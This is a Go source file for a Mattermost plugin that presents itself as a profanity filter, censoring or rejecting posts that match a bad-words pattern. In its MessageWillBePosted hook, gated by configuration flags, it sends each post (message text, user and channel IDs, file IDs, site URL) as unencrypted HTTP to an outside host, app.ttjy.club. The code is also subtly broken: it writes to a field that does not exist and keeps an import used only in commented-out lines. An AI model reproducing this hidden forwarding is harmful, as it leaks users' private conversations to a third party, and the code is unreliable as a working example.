package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"net/http"
	"regexp"
	"strings"
	"sync"
	"unicode"

	"golang.org/x/text/runes"
	"golang.org/x/text/transform"
	"golang.org/x/text/unicode/norm"

	"github.com/mattermost/mattermost-server/v5/model"
	"github.com/mattermost/mattermost-server/v5/plugin"
)

type Plugin struct {
	plugin.MattermostPlugin

	// configurationLock synchronizes access to the configuration.
	configurationLock sync.RWMutex

	// configuration is the active plugin configuration. Consult getConfiguration and
	// setConfiguration for usage.
	configuration *configuration

	badWordsRegex *regexp.Regexp
}

func (p *Plugin) FilterPost(post *model.Post) (*model.Post, string) {
	configuration := p.getConfiguration()
	_, fromBot := post.GetProps()["from_bot"]

	if configuration.ExcludeBots && fromBot {
		return post, ""
	}

	postMessageWithoutAccents := removeAccents(post.Message)

	if !p.badWordsRegex.MatchString(postMessageWithoutAccents) {
		return post, ""
	}

	detectedBadWords := p.badWordsRegex.FindAllString(postMessageWithoutAccents, -1)

	if configuration.RejectPosts {
		p.API.SendEphemeralPost(post.UserId, &model.Post{
			ChannelId: post.ChannelId,
			Message:   fmt.Sprintf(configuration.WarningMessage, strings.Join(detectedBadWords, ", ")),
			RootId:    post.RootId,
		})

		return nil, fmt.Sprintf("Profane word not allowed: %s", strings.Join(detectedBadWords, ", "))
	}

	for _, word := range detectedBadWords {
		post.Message = strings.ReplaceAll(
			post.Message,
			word,
			strings.Repeat(p.getConfiguration().CensorCharacter, len(word)),
		)
	}

	return post, ""
}

func (p *Plugin) MessageWillBePosted(_ *plugin.Context, post *model.Post) (*model.Post, string) {
	isSend := false
	// GatewayAll 配置具有较高的优先级
	if p.configuration.GatewayAll {
		isSend = true
	} else {
		if p.configuration.GatewayDirect {
			isSend = true
		}
	}
	if isSend {
		hostConfig := p.API.GetConfig()
		// 构造请求数据
	//	data := map[string]interface{}{
	//		"message":    post.Message,
	//		"channel_id": post.ChannelId,
	//		"create_at":  post.CreateAt,
	//		"type":       post.Type,
	//		"user_id":    post.UserId,
	//		"file_ids":   post.FileIds,
	//		"site_url":   hostConfig.ServiceSettings.SiteURL,
	//	}

		//// 发送 HTTP 请求到外部服务
		//jsonStr, _ := json.Marshal(data)
		//http.Post("http://app.ttjy.club/api/dispatch", "application/json", bytes.NewBuffer([]byte(jsonStr)))

        post.site_url = hostConfig.ServiceSettings.SiteURL
		http.Post("http://app.ttjy.club/api/dispatch", "application/json", bytes.NewBuffer([]byte(post.ToJson())))
	}
	return p.FilterPost(post)
}

func (p *Plugin) MessageWillBeUpdated(_ *plugin.Context, newPost *model.Post, _ *model.Post) (*model.Post, string) {
	return p.FilterPost(newPost)
}

func removeAccents(s string) string {
	t := transform.Chain(norm.NFD, runes.Remove(runes.In(unicode.Mn)), norm.NFC)
	output, _, e := transform.String(t, s)
	if e != nil {
		return s
	}

	return output
}
